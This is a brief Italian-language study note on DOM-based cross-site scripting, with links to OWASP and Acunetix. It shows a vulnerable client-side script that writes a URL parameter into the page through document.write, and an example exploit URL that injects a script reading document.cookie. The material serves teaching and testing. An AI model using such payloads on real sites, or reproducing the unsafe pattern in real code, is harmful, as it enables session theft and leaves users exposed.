## XSS (DOM)

- https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
- https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)
- https://www.acunetix.com/blog/articles/dom-xss-explained/

Il payload viene eseguito in modo da modificare sul browser della vittima un elemento DOM, usato originariamente dallo script client-side.

Codice vulnerabile:

`http://www.some.site/page.html?default=French`

```
<select><script>

document.write("<OPTION value=1>"+document.location.href.substring(document.location.href.indexOf("default=")+8)+"</OPTION>");

document.write("<OPTION value=2>English</OPTION>");

</script></select>
```

Exploit:

```
http://www.some.site/page.html?default=<script>alert(document.cookie)</script>
```

